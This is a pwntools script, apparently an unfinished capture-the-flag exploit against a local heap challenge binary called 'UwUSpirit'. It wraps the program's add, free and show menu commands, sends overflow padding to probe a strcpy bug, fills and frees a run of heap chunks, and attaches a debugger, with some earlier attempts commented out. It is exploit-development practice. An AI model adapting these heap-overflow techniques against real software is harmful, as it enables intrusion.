from pwn import * 

binary = "./UwUSpirit_patched"
p = process(binary)
elf = ELF(binary)
libc = ELF('./libc.so.6')
context.binary = binary
context.log_level = 'debug'

s = '''
b *UwU
b *awa
b *QAQ
b * main+87
'''

def add(index, size, content):
    p.sendlineafter(b'> ', b'UwU')
    p.sendlineafter(b'?\n', str(index).encode())
    p.sendlineafter(b'?\n', str(size).encode())
    p.sendafter(b'UwU:\n', content)

def free(index):
    p.sendlineafter(b'> ', b'QAQ')
    p.sendlineafter(b'?\n', str(index).encode())

def show(index):
    p.sendlineafter(b'> ', b'awa')
    p.sendlineafter(b'?\n', str(index).encode())



# investigating strcpy behaviour, attempting to overflow UUUwwUUU, 

'''
add(1, 0x20, b'A'*0x20)  
free(1)
show(1)

payload = 'X' * 0x21 # fill the buffer completely 
p.sendafter('> ', payload) 
payload = 'Y' * 0x20 # fill the buffer completely 
p.sendafter('> ', payload) 
payload = 'Z' * 0x20 # fill the buffer completely 
p.sendafter('> ', payload) 
payload = 'K' * 0x20 # fill the buffer completely 
p.sendafter('> ', payload) 
'''

# The read call limits to 0x20 bytes, so this:
# Now when we send the second part:
add(0, 0x10, b'A'*0x10)  

payload2 = b'A' * 0x20    # Fill UwU_buf completely

p.send(payload2)          # Use send instead of sendline to avoid newline
# strcpy will continue past UUUwwUUU into UwUUwUUwUUwU

show(0)

#free(0)

for i in range (1, 0x10):
	add(i, 0x90, b'B'*0x10) 
for i in range (1, 9):
	add(i, 0x90, b'B'*0x10) 
add(0, 0x90, b'B'*0x10) 
payload2 = b'A' * 0x20    # Fill UwU_buf completely

p.send(payload2) 
gdb.attach(p, s)

for i in range (1, 9):
	free(i)


p.interactive()
